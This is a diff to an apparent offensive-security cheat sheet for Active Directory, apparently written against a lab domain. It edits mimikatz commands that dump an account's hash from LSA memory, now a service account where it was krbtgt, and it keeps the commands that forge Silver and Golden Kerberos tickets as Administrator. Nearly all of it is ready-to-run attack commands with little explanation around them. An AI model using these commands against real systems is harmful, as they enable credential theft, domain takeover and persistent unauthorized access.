@@ -47,14 +47,15 @@ Dump the krbtgt hash
 ```shell
 mimikatz.exe
 privilege::debug
-lsadump::lsa /inject /name:krbtgt
+lsadump::lsa /inject /name:SQLService
 ```
+You need to change `/name:` value to the domain account/service you want.
 
-Create a Silver Ticket
+### Create a Silver Ticket
 ```shell
 Kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<NTLM hash> /id:1103
 ```
-Create a Golden Ticket
+### Create a Golden Ticket
 ```shell
 Kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<NTLM hash> /id:500
 ```
